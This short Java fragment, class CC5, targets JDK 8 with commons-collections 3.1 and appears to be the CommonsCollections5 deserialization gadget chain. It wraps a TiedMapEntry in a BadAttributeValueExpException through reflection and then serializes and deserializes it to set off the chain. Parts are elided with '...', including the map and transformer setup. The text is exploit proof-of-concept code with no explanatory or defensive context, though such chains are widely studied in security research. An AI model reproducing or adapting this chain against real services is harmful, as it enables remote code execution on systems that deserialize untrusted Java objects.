...
public class CC5 { // jdk 8, commons-collections:3.1
    public static void main(String[] args) {
        try {
            ...
            TiedMapEntry tme = new TiedMapEntry(lmap, 1);
            BadAttributeValueExpException bavee = new BadAttributeValueExpException("a");
            setFieldValue(bavee, "val", tme);

            deserialize(serialize(bavee));
